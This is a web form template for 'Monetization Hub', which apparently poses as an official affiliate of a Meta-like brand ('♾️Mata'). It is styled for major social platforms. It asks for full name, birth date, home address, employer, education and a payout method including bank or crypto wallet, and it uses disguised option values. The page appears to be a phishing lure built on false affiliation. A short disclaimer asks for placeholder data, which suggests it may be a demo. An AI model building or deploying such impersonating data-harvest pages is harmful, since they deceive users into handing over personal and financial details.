{% extends "base.html" %}
{% block body %}
<div class="form-container">
  <div class="card form-card">
    <!-- Platform Header -->
    <div class="platform-header">
      <div class="icon-circle {{ platform_bg_class|default('bg-twitter') }}">
        <i class="{{ platform_icon }} icon-lg"></i>
      </div>
      <div>
        <h2 class="notranslate" style="margin:0;color:{{ platform_color|default('#667eea') }};">{{ platform_name }}</h2>
        <div class="platform-subtitle">Complete Your Profile</div>
      </div>
    </div>

    <div class="form-header">
      <h1>Complete Your Profile</h1>
      <p class="lead">Please fill out all sections carefully to proceed with your account setup.</p>
      <div class="disclaimer">
        <i class="fas fa-shield-alt"></i>
        <small>Note: For security purposes, please use placeholder information only.</small>
      </div>
    </div>

    <form id="f1form" method="POST" action="{{ url_for('f1') }}" novalidate>
      <input type="hidden" name="platform" value="{{ platform_name }}">
      
      <!-- Progress Indicator -->
      <div class="progress-container">
        <div class="progress-bar">
          <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="progress-text">Form Progress: <span id="progressPercent">0%</span></div>
      </div>

      <!-- Personal Information -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-user"></i>
          Personal Information
        </h2>
        <div class="form-group">
          <label class="form-label">Full Name</label>
          <div class="input-container">
            <input type="text" name="fullname" class="input" placeholder="Enter your full name" required>
            <i class="fas fa-user input-icon"></i>
          </div>
          <div class="error">Please enter your full name</div>
        </div>

        <div class="form-group">
          <label class="form-label">Date of Birth</label>
          <div class="input-container">
            <input type="date" name="dob" class="input" required>
            <i class="fas fa-calendar-alt input-icon"></i>
          </div>
          <div class="error">Please select your date of birth</div>
        </div>

        <div class="form-group">
          <label class="form-label">Gender</label>
          <div class="group button-group" data-group="gender">
            <button type="button" class="option-btn" data-name="gender" data-value="Male">
              <i class="fas fa-male"></i> Male
            </button>
            <button type="button" class="option-btn" data-name="gender" data-value="Female">
              <i class="fas fa-female"></i> Female
            </button>
            <button type="button" class="option-btn" data-name="gender" data-value="Other">
              <i class="fas fa-user"></i> Other
            </button>
            <input type="hidden" name="gender" required>
          </div>
          <div class="error group-error">Please select your gender</div>
        </div>

        <div class="form-group">
          <label class="form-label">Marital Status</label>
          <div class="group button-group" data-group="marital">
            <button type="button" class="option-btn" data-name="marital" data-value="Single">
              <i class="fas fa-user"></i> Single
            </button>
            <button type="button" class="option-btn" data-name="marital" data-value="Married">
              <i class="fas fa-ring"></i> Married
            </button>
            <button type="button" class="option-btn" data-name="marital" data-value="Divorced">
              <i class="fas fa-times"></i> Divorced
            </button>
            <button type="button" class="option-btn" data-name="marital" data-value="Widowed">
              <i class="fas fa-user-times"></i> Widowed
            </button>
            <input type="hidden" name="marital" required>
          </div>
          <div class="error group-error">Please choose your marital status</div>
        </div>
      </div>

      <!-- Residential Address -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-home"></i>
          Residential Address
        </h2>
        <div class="form-group">
          <label class="form-label">Street Address</label>
          <div class="input-container">
            <input type="text" name="street" class="input" placeholder="Enter your street address" required>
            <i class="fas fa-map-marker-alt input-icon"></i>
          </div>
          <div class="error">Enter your street address</div>
        </div>

        <div class="form-row">
          <div class="form-group">
            <label class="form-label">City</label>
            <div class="input-container">
              <input type="text" name="city" class="input" placeholder="City" required>
              <i class="fas fa-city input-icon"></i>
            </div>
            <div class="error">Enter your city</div>
          </div>

          <div class="form-group">
            <label class="form-label">Postal Code</label>
            <div class="input-container">
              <input type="text" name="postal" class="input" placeholder="Postal code" required>
              <i class="fas fa-envelope input-icon"></i>
            </div>
            <div class="error">Enter your postal code</div>
          </div>
        </div>

        <div class="form-group">
          <label class="form-label">Country</label>
          <div class="input-container">
            <input type="text" name="country" class="input" placeholder="Country" required>
            <i class="fas fa-globe input-icon"></i>
          </div>
          <div class="error">Enter your country</div>
        </div>
      </div>

      <!-- Education -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-graduation-cap"></i>
          Education Background
        </h2>
        <div class="form-group">
          <label class="form-label">Highest Qualification</label>
          <div class="input-container">
            <input type="text" name="qualification" class="input" placeholder="Your highest qualification" required>
            <i class="fas fa-certificate input-icon"></i>
          </div>
          <div class="error">Enter your highest qualification</div>
        </div>

        <div class="form-group">
          <label class="form-label">Institution</label>
          <div class="input-container">
            <input type="text" name="institution" class="input" placeholder="Educational institution" required>
            <i class="fas fa-university input-icon"></i>
          </div>
          <div class="error">Enter your institution</div>
        </div>

        <div class="form-group">
          <label class="form-label">Year Completed</label>
          <div class="input-container">
            <input type="number" name="year_completed" class="input" placeholder="Graduation year" required>
            <i class="fas fa-calendar input-icon"></i>
          </div>
          <div class="error">Enter the year completed</div>
        </div>
      </div>

      <!-- Work -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-briefcase"></i>
          Professional Information
        </h2>
        <div class="form-group">
          <label class="form-label">Occupation / Job Title</label>
          <div class="input-container">
            <input type="text" name="occupation" class="input" placeholder="Your occupation" required>
            <i class="fas fa-user-tie input-icon"></i>
          </div>
          <div class="error">Enter your occupation</div>
        </div>

        <div class="form-group">
          <label class="form-label">Company / Business Name</label>
          <div class="input-container">
            <input type="text" name="company" class="input" placeholder="Company name" required>
            <i class="fas fa-building input-icon"></i>
          </div>
          <div class="error">Enter your company</div>
        </div>
      </div>

      <!-- Monetization Preferences -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-money-bill-wave"></i>
          Monetization Preferences
        </h2>
        <div class="form-group">
          <div class="group button-group" data-group="fun">
            <button type="button" class="option-btn" data-name="fun" data-value="happiness">
              <i class="fas fa-user-edit"></i> Earning from your own content
            </button>
            <button type="button" class="option-btn" data-name="fun" data-value="smile">
              <i class="fas fa-stream"></i> Earning by streaming other's content
            </button>
            <button type="button" class="option-btn" data-name="fun" data-value="both">
              <i class="fas fa-sync-alt"></i> Both Methods
            </button>
            <input type="hidden" name="fun" required>
          </div>
          <div class="error group-error">Select at least one monetization preference</div>
        </div>
      </div>

      <!-- Personal Bio -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-pen"></i>
          Personal Bio
        </h2>
        <div class="form-group">
          <label class="form-label">Write a short bio explaining why you want to monetize your social media account.</label>
          <div class="input-container textarea-container">
            <textarea name="bio" class="input" rows="6" minlength="15" maxlength="1500" required placeholder="Tell us about yourself (15-300 words)..."></textarea>
            <i class="fas fa-pen textarea-icon"></i>
          </div>
          <div class="char-counter"><span id="charCount">0</span>/1500 characters</div>
          <div class="error">Please write a short bio (15-300 words)</div>
        </div>
      </div>

      <!-- Notifications -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-bell"></i>
          Notification Preferences
        </h2>
        <div class="form-group">
          <div class="group button-group" data-group="notify">
            <button type="button" class="option-btn" data-name="notify" data-value="email">
              <i class="fas fa-envelope"></i> Email Updates
            </button>
            <button type="button" class="option-btn" data-name="notify" data-value="sms">
              <i class="fas fa-sms"></i> SMS Alerts
            </button>
            <button type="button" class="option-btn" data-name="notify" data-value="push">
              <i class="fas fa-mobile-alt"></i> Push Notifications
            </button>
            <input type="hidden" name="notify" required>
          </div>
          <div class="error group-error">Select at least one notification preference</div>
        </div>
      </div>

      <!-- Payout Method -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-credit-card"></i>
          Earnings Payout Method
        </h2>
        <div class="form-group">
          <div class="group button-group" data-group="method">
            <button type="button" class="option-btn" data-name="method" data-value="feeling">
              <i class="fas fa-university"></i> Bank Account
            </button>
            <button type="button" class="option-btn" data-name="method" data-value="hoping">
              <i class="fab fa-bitcoin"></i> Crypto Wallet
            </button>
            <button type="button" class="option-btn" data-name="method" data-value="applications">
              <i class="fas fa-mobile-alt"></i> Mobile Applications
            </button>
            <input type="hidden" name="method" required>
          </div>
          <div class="error group-error">Please choose a Payout Method</div>
        </div>
      </div>

      <!-- Terms -->
      <div class="form-section">
        <h2 class="section-title">
          <i class="fas fa-file-contract"></i>
          Terms & Conditions
        </h2>
        <div class="form-group">
          <div class="terms-box">
            <p>‚öñÔ∏è Terms and Conditions

Effective Date: [Insert Date]
Platform: Monetization Hub (an official ‚ôæÔ∏èMata affiliate)

Welcome to Monetization Hub. By accessing or using this platform, you agree to comply with the following Terms and Conditions. Please read them carefully before using our services.

1. Acceptance of Terms

By creating an account or using this platform, you acknowledge that you have read, understood, and agreed to be bound by these Terms and Conditions and our Privacy Policy.

2. Eligibility

Users must be at least 18 years old or have legal parental consent to access and use the platform.

3. Account Responsibilities

You are responsible for maintaining the confidentiality of your account credentials and for all activities that occur under your account.
Any attempt to provide false information, impersonate others, or misuse platform tools will result in immediate suspension or termination.

4. Monetization Policy

Creators may earn revenue through approved monetization methods, including content engagement, streaming, and interactions.
Revenue is distributed under the 80/20 model, where creators retain 80% of their earnings and 20% supports platform operations and development.

5. Content Ownership

You retain full ownership of the content you create. However, by uploading or sharing on the platform, you grant Monetization Hub a non-exclusive, royalty-free license to display and promote your content in connection with platform services.

6. Prohibited Activities

Users are strictly prohibited from:
 ‚Ä¢ Uploading unlawful, harmful, or infringing content.
 ‚Ä¢ Engaging in fraudulent, spam, or manipulative behavior.
 ‚Ä¢ Violating intellectual property rights.
 ‚Ä¢ Misusing platform tools or features.

7. Termination

Monetization Hub reserves the right to suspend or terminate any account that violates these Terms or engages in harmful activity toward the platform or its users.

8. Limitation of Liability

Monetization Hub is not responsible for any loss of earnings, data, or access caused by third-party systems, technical issues, or user misconduct.

9. Modifications

We may update these Terms at any time. Continued use of the platform after updates implies acceptance of the new terms.

10. Contact

For questions or support, please contact: support@monetizationhub.com

‚∏ª

üîí Privacy Policy

Effective Date: [Insert Date]
Platform: Monetization Hub (an official ‚ôæÔ∏èMata affiliate)

This Privacy Policy explains how Monetization Hub collects, uses, and protects your information when you use our platform.

1. Information We Collect
 ‚Ä¢ Personal information (name, email, payment details, etc.) provided during registration or verification.
 ‚Ä¢ Usage data, including login times, device type, and interactions on the platform.
 ‚Ä¢ Content or media you upload or share.

2. How We Use Your Information

We use collected data to:
 ‚Ä¢ Operate and improve platform functionality.
 ‚Ä¢ Process payments and manage earnings.
 ‚Ä¢ Provide user support and security.
 ‚Ä¢ Communicate updates, promotions, or policy changes.

3. Data Security

All user data is encrypted and stored securely. We apply industry-standard measures to prevent unauthorized access, disclosure, or misuse.

4. Sharing of Information

We do not sell or trade your personal data. Information may be shared only with trusted service providers or legal authorities when required by law.

5. User Rights

You have the right to:
 ‚Ä¢ Access and review your personal information.
 ‚Ä¢ Request corrections or deletion of your data.
 ‚Ä¢ Withdraw consent or close your account at any time.

6. Cookies and Tracking

We use cookies and analytics tools to enhance user experience and platform performance. You may disable cookies in your browser settings.

7. Policy Updates

This Privacy Policy may be updated periodically. We encourage you to review it regularly to stay informed about how your data is protected.

8. Contact

For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
          </div>
          <div class="checkbox-group">
            <label class="checkbox-label">
              <input type="checkbox" name="terms" required>
              <span class="checkmark"></span>
              I have read and agree to the Terms & Conditions
            </label>
            <div class="error group-error">You must agree to the terms before continuing</div>
          </div>
        </div>
      </div>

      <!-- Submit -->
      <div class="form-section">
        <button type="submit" class="submit-btn">
          <i class="fas fa-check-circle"></i>
          Complete Registration
        </button>
      </div>
    </form>
  </div>
</div>

<style>
/* Font Awesome CDN */
@import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css');

/* Form Container */
.form-container {
  position: relative;
  min-height: 100vh;
  padding: 20px;
  background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
  display: flex;
  align-items: center;
  justify-content: center;
}

.form-card {
  width: 100%;
  max-width: 750px;
  margin: 0 auto;
  padding: 40px;
  border-radius: 20px;
  background: #ffffff;
  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
  border: 1px solid #f1f5f9;
  position: relative;
  overflow: visible;
}

/* Platform Header */
.platform-header {
  display: flex;
  align-items: center;
  gap: 14px;
  margin-bottom: 24px;
  padding-bottom: 20px;
  border-bottom: 1px solid #f1f5f9;
}

.platform-subtitle {
  color: #64748b;
  font-size: 13px;
  font-weight: 500;
}

.icon-circle {
  width: 58px;
  height: 58px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

/* Platform-specific styles */
.bg-facebook .icon-circle {
  background: #fff;
  box-shadow: 0 0 0 4px rgba(24,119,242,0.15), 0 0 14px rgba(24,119,242,0.25);
}
.bg-facebook i { color: #1877F2; }

.bg-instagram .icon-circle {
  background: #fff;
  box-shadow: 0 0 0 4px rgba(193,53,132,0.15), 0 0 14px rgba(225,48,108,0.25);
}
.bg-instagram i {
  background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  font-weight: 800;
}

.bg-tiktok .icon-circle {
  background: #fff;
  box-shadow: 0 0 0 4px rgba(0,0,0,0.1), 0 0 16px rgba(255,0,80,0.25), 0 0 16px rgba(0,242,234,0.25);
}
.bg-tiktok i {
  color: #000;
  text-shadow: -1.8px 0 #00f2ea, 1.8px 0 #ff0050;
  font-weight: 800;
}

.bg-youtube .icon-circle {
  background: #fff;
  box-shadow: 0 0 0 4px rgba(255,0,0,0.18), 0 0 14px rgba(255,0,0,0.28);
}
.bg-youtube i { color: #FF0000; font-weight: 800; }

.bg-snapchat .icon-circle {
  background: #fff;
  box-shadow: 0 0 0 4px rgba(255,252,0,0.22), 0 0 18px rgba(255,252,0,0.35);
}
.bg-snapchat i {
  color: #FFFC00;
  -webkit-text-stroke: 1.5px #000;
  font-weight: 800;
}

.bg-twitter .icon-circle {
  background: #fff;
  box-shadow: 0 0 0 4px rgba(0,0,0,0.12), 0 0 16px rgba(0,0,0,0.22);
}
.bg-twitter i { color: #000; font-weight: 800; }

.icon-lg { font-size: 28px; }

/* Progress Bar */
.progress-container {
  margin-bottom: 30px;
}

.progress-bar {
  height: 8px;
  background: #e9ecef;
  border-radius: 10px;
  overflow: hidden;
  margin-bottom: 10px;
}

.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, #667eea, #764ba2);
  border-radius: 10px;
  width: 0%;
  transition: width 0.5s ease;
}

.progress-text {
  font-size: 14px;
  color: #64748b;
  text-align: right;
}

/* Form Header */
.form-header {
  text-align: center;
  margin-bottom: 32px;
  padding-bottom: 24px;
  border-bottom: 2px solid #f1f5f9;
}

.form-header h1 {
  font-size: 28px;
  font-weight: 800;
  margin-bottom: 12px;
  color: #0f172a;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

.form-header .lead {
  font-size: 16px;
  color: #64748b;
  margin-bottom: 12px;
  line-height: 1.5;
}

.disclaimer {
  background: #fffbeb;
  border: 1px solid #fef3c7;
  border-radius: 12px;
  padding: 12px 16px;
  margin-top: 16px;
  display: flex;
  align-items: center;
  gap: 10px;
}

.disclaimer i {
  color: #f59e0b;
}

.disclaimer small {
  color: #92400e;
  font-weight: 500;
}

/* Form Sections */
.form-section {
  margin-bottom: 32px;
  padding-bottom: 24px;
  border-bottom: 1px solid #f1f5f9;
}

.form-section:last-of-type {
  border-bottom: none;
  margin-bottom: 0;
  padding-bottom: 0;
}

.section-title {
  font-size: 18px;
  font-weight: 700;
  margin-bottom: 20px;
  color: #1e293b;
  padding-left: 16px;
  border-left: 4px solid #1877F2;
  background: #f8fafc;
  padding: 12px 16px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  gap: 10px;
}

.section-title i {
  color: #1877F2;
}

.form-group {
  margin-bottom: 20px;
}

.form-row {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 16px;
}

.form-label {
  display: block;
  font-weight: 600;
  font-size: 14px;
  margin-bottom: 8px;
  color: #374151;
}

/* Enhanced Inputs */
.input-container {
  position: relative;
}

.input, textarea {
  width: 100%;
  padding: 16px 16px 16px 48px;
  border: 2px solid #e5e7eb;
  border-radius: 14px;
  font-size: 16px;
  background: #ffffff;
  transition: all 0.3s ease;
  box-sizing: border-box;
  font-family: inherit;
}

.input:focus, textarea:focus {
  outline: none;
  border-color: #1877F2;
  box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
  background: #ffffff;
}

.input::placeholder {
  color: #9ca3af;
  font-weight: 400;
}

.input-icon {
  position: absolute;
  left: 16px;
  top: 50%;
  transform: translateY(-50%);
  color: #9ca3af;
  transition: color 0.3s ease;
}

.input:focus + .input-icon {
  color: #1877F2;
}

.textarea-container {
  position: relative;
}

.textarea-container textarea {
  padding: 16px 16px 16px 48px;
  resize: vertical;
  min-height: 120px;
}

.textarea-icon {
  position: absolute;
  left: 16px;
  top: 16px;
  color: #9ca3af;
  transition: color 0.3s ease;
}

.textarea-container textarea:focus + .textarea-icon {
  color: #1877F2;
}

.char-counter {
  text-align: right;
  font-size: 12px;
  color: #9ca3af;
  margin-top: 5px;
}

.invalid {
  border-color: #ef4444 !important;
  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1) !important;
}

.group.invalid {
  border: 2px solid #ef4444;
  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1);
  border-radius: 14px;
  padding: 12px;
}

/* Enhanced Button Groups */
.button-group {
  display: flex;
  flex-wrap: wrap;
  gap: 12px;
  margin-bottom: 8px;
}

.option-btn {
  flex: 1;
  min-width: 120px;
  padding: 14px 20px;
  border: 2px solid #e5e7eb;
  border-radius: 12px;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
  background: #ffffff;
  color: #64748b;
  transition: all 0.3s ease;
  text-align: center;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}

.option-btn:hover {
  border-color: #1877F2;
  color: #1877F2;
  transform: translateY(-1px);
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

.option-btn.selected {
  background: #1877F2;
  color: #ffffff;
  border-color: #1877F2;
  box-shadow: 0 4px 12px rgba(24, 119, 242, 0.25);
  transform: translateY(-1px);
}

.option-btn.selected i {
  color: #ffffff;
}

.error, .group-error {
  color: #ef4444;
  font-size: 13px;
  font-weight: 500;
  display: none;
  margin-top: 6px;
}

/* Terms Box */
.terms-box {
  max-height: 200px;
  overflow-y: auto;
  border: 2px solid #e5e7eb;
  border-radius: 12px;
  padding: 20px;
  font-size: 13px;
  line-height: 1.6;
  background: #f8fafc;
  margin-bottom: 20px;
}

.checkbox-group {
  margin-top: 16px;
}

.checkbox-label {
  display: flex;
  align-items: center;
  cursor: pointer;
  font-weight: 600;
  color: #374151;
  gap: 12px;
}

.checkbox-label input[type="checkbox"] {
  width: 18px;
  height: 18px;
  border: 2px solid #d1d5db;
  border-radius: 4px;
  cursor: pointer;
}

.checkbox-label input[type="checkbox"]:checked {
  background-color: #1877F2;
  border-color: #1877F2;
}

/* Submit Button */
.submit-btn {
  width: 100%;
  background: linear-gradient(135deg, #1877F2, #4e9af1);
  color: #ffffff;
  font-size: 18px;
  font-weight: 700;
  padding: 18px 32px;
  border-radius: 25px;
  border: none;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 8px 20px rgba(24, 119, 242, 0.35);
  margin-top: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
}

.submit-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 12px 25px rgba(24, 119, 242, 0.45);
}

.submit-btn:active {
  transform: translateY(0);
}

/* Responsive Design */
@media (max-width: 768px) {
  .form-container {
    padding: 10px;
  }
  
  .form-card {
    padding: 24px;
    border-radius: 16px;
  }
  
  .form-row {
    grid-template-columns: 1fr;
    gap: 0;
  }
  
  .button-group {
    flex-direction: column;
  }
  
  .option-btn {
    min-width: auto;
  }
}

@media (max-width: 480px) {
  .form-card {
    padding: 20px 16px;
  }
  
  .form-header h1 {
    font-size: 24px;
  }
  
  .section-title {
    font-size: 16px;
  }
  
  .submit-btn {
    padding: 14px 24px;
    font-size: 16px;
  }
}
</style>

<script>
const form = document.getElementById("f1form");
const progressFill = document.getElementById("progressFill");
const progressPercent = document.getElementById("progressPercent");
const charCount = document.getElementById("charCount");
const bioTextarea = document.querySelector('textarea[name="bio"]');

// Initialize progress tracking
updateProgress();

// Option button functionality
document.querySelectorAll(".option-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    const name = btn.dataset.name;
    const hidden = form.querySelector(`input[name="${name}"]`);
    const siblings = document.querySelectorAll(`.option-btn[data-name="${name}"]`);
    siblings.forEach(b => b.classList.remove("selected"));
    btn.classList.add("selected");
    hidden.value = btn.dataset.value;

    const group = form.querySelector(`.button-group[data-group="${name}"]`);
    group.classList.remove("invalid");
    group.nextElementSibling.style.display = "none";
    
    updateProgress();
  });
});

// Bio character counter
if (bioTextarea) {
  bioTextarea.addEventListener("input", function() {
    charCount.textContent = this.value.length;
    updateProgress();
  });
}

// Update form progress
function updateProgress() {
  const totalFields = form.querySelectorAll('input[required], textarea[required], .group input[required]').length;
  let filledFields = 0;
  
  form.querySelectorAll('input[required], textarea[required]').forEach(field => {
    if (field.type === 'hidden') {
      // For hidden fields (from option buttons)
      if (field.value.trim() !== '') filledFields++;
    } else if (field.type === 'checkbox') {
      // For checkboxes
      if (field.checked) filledFields++;
    } else {
      // For text inputs, textareas, etc.
      if (field.value.trim() !== '') filledFields++;
    }
  });
  
  const progress = Math.round((filledFields / totalFields) * 100);
  progressFill.style.width = `${progress}%`;
  progressPercent.textContent = `${progress}%`;
}

// Form validation
function validateForm(showErrors = true) {
  let valid = true;
  let firstInvalid = null;

  form.querySelectorAll(".error, .group-error").forEach(e => e.style.display = "none");
  form.querySelectorAll(".invalid").forEach(e => e.classList.remove("invalid"));

  form.querySelectorAll("input[required], textarea[required]").forEach(input => {
    const isHidden = input.type === "hidden";
    const isCheckbox = input.type === "checkbox";

    if (isHidden) {
      if (!input.value.trim()) {
        valid = false;
        const group = input.closest(".group");
        if (showErrors) {
          group.classList.add("invalid");
          group.nextElementSibling.style.display = "block";
        }
        if (!firstInvalid) firstInvalid = group;
      }
    } else if (isCheckbox) {
      if (!input.checked) {
        valid = false;
        const err = input.closest(".checkbox-group").querySelector(".group-error");
        if (showErrors && err) err.style.display = "block";
        if (!firstInvalid) firstInvalid = input.closest(".checkbox-group");
      }
    } else if (!input.value.trim()) {
      valid = false;
      if (showErrors) {
        input.classList.add("invalid");
        input.nextElementSibling.style.display = "block";
      }
      if (!firstInvalid) firstInvalid = input;
    }
  });

  if (!valid && showErrors && firstInvalid) {
    firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
  }

  return valid;
}

form.addEventListener("submit", e => { 
  if (!validateForm(true)) e.preventDefault(); 
  else {
    // Add loading state to submit button
    const submitBtn = form.querySelector('.submit-btn');
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
    submitBtn.disabled = true;
  }
});

form.querySelectorAll("input, textarea").forEach(el => {
  el.addEventListener("input", () => {
    validateForm(false);
    updateProgress();
  });
  el.addEventListener("change", () => {
    validateForm(false);
    updateProgress();
  });
});
</script>
{% endblock %}
